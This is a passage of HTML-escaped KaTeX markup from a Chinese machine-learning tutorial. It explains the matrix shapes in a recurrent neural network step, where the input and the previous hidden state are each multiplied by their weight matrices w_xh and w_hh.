mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，batch和词向量维度feature len，与一个权重矩阵&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;/msubsup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;w_{xh}^T&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.1244389999999997em;vertical-align:-0.2831079999999999em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8413309999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4168920000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2831079999999999em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;做矩阵运算，权重矩阵&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;w_{xh}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.58056em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;的维度为二维&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;[hidden\space len, featrue\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，hidden len表示隐层向量的维度，矩阵运算完的维度为&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;[batch, hidden\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;另一个输入是上一时刻的隐层状态&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;h_{t-1}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.902771em;vertical-align:-0.208331em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.301108em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.208331em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，它的维度是&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;[batch, hidden\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，与权重矩阵&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;/msubsup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;w_{hh}^T&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.1244389999999997em;vertical-align:-0.2831079999999999em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8413309999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4168920000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2831079999999999em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;做矩阵运算，矩阵&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;/msubsup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;w_{hh}^T&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.1244389999999997em;vertical-align:-0.2831079999999999em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8413309999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4168920000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2831079999999999em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;的维度是&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;[hidden\space len,hidden\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，运算结果的维度是&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;[batch, hidden\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;。&lt;/p&gt;
